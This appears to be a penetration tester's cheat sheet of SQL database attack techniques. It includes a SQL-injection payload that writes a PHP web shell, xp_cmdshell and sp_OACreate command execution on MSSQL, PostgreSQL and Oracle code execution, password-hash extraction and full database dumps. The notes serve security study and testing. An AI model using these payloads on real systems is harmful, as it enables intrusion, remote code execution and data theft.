---
layout: blank
pagetitle: SQL Attacks
---

## General Database viewer tools
- Use `dbeaver` on kali, has a nice GUI and everything

## MySQL
- MariaDB is an open-source fork
- `mysql -u {username} -p -h {host IP} -P {port}`
- Specifying multiple parameters `SELECT user, passhash FROM mysql.user WHERE user = '{username}'`
- Enumeration:
	- List all databases: `SELECT * FROM information_schema.tables;`
	- Version: `SELECT @@version;`
	- Current user: `SELECT system_user();`
- MySQL RCE via SQLi
	- Use the `INTO OUTFILE` to create a PHP/JSP/ASPX/etc shell
		- Example: `' UNION SELECT "<?php system('whoami');?>", null, null INTO OUTFILE "/var/www/html/tmp/shell.php" -- // `
			- `tmp` is important, because we might not have perms for `/html`
		- Then, either LFI the new file or straight up access it if possible
	- Can also extract users/passwords and crack hashes
	- Could search up phpmyadmin version to get RCE (LFI + session cookie can lead to RCE)
- Dumping MySQL: `mysqldump -h [host] -u [user] -p[password] --all-databases > mysql_all_dbs.sql`


## MSSQL
- Database management built into Windows	
- Controlled via `Invoke-Sqlcmd`
  - `Install-Module -Name SqlServer -Force`
  - `Invoke-Sqlcmd -ServerInstance localhost\{SQL_server_name} -Database {database_like_master} -Query {query}`
- Importing [PowerUPSQL](https://github.com/NetSPI/PowerUpSQL) can give some useful Powershell commands, like `Get-SQLInstanceLocal` to identify local mssql servers
  - Cheatsheet: [https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
  - `Get-SQLServerPasswordHash` gets SQL server login passwords
  - Inspecting linked servers: `Get-SQLServerLink` 
    	- With auth: `-Username {mssql_username} -Password {mssql_password}  -Instance {server_name} -Verbose`
- Kali has `impacket-mssqlclient` to connect to MSSQL databases
	- `impacket-mssqlclient {username}@{host IP} -windows-auth`
		- After opening SQL terminal, can run EXECUTE commands using xp_cmdshell
			- This can be enabled by a user with permissions with 
			- `EXECUTE sp_configure 'show advanced options', 1; 
				- Showing advanced options is actually required to run xp_cmdshell
			- `RECONFIGURE;` 
			- `EXECUTE sp_configure 'xp_cmdshell', 1;`
			- `RECONFIGURE;`
			- Then, pass arbitrary commands with `EXECUTE xp_cmdshell 'whoami';`
	- `-windows-auth` forces the use of NTLM auth (rather than Kerberos)
	- `trustlink`, `sp_linkedservers`, and `use_link` for linked servers
- List all databases: 
	- `SELECT name FROM sys.databases;`
	- Then, `SELECT * FROM {database name from first query}.information_schema.tables;`
	- This returns the tables within that database, which we can query from with `SELECT * from {database name}.dbo.{table name}`
		- `dbo` is a table schema
- Can also use `sp_OACreate` to execute system commands
	`EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT; EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd.exe /c {command}';`
- Linked servers can execute remote queries
  - `SELECT * FROM OPENQUERY( {linked_server_name}, '{query}')`
- Dumping MSSQL (table names): `Invoke-Sqlcmd -ServerInstance [server] -Username [user] -Password [password] -Query "SELECT name FROM master.sys.databases" | Format-Table -AutoSize > mssql_dbs.txt`

## SQLite
- Use `sqlitebrowser` for viewing sqlite databases
- Can't execute functions, but can load malicious files
	- `SELECT load_extension('/tmp/malicious.so');`
- `SQLite CLI` allows command execution with `.shell {command}` or `.system {command}`
- Outdated versions may have RCE CVEs

## PostgreSQL
- Use `psql` for to connect to PostgreSQL databases
- Command execution with `COPY mytable TO PROGRAM 'whoami';`
	- Requires superuser
- Command execution with `SELECT pg_execute_server_program('id');`
	- This won't require superuser, but will require `pg_execute_server_program`
- Dumping PostgreSQL: `pg_dump -h [host] -U [username] -F c -b -v -f postgresql_all.dump postgres`

## Oracle
- Comand execution with `EXEC dbms_java.runjava('java.lang.Runtime.getRuntime().exec("{command}")');`
- Dumping Oracle: `sqlplus [username]/[password]@[host]/[SID] @extract.sql > oracle_data.txt`

## MongoDB
- Dumping MongoDB: `mongodump --host [host] --port [port] --username [user] --password [password] --out ./mongodb_dump`
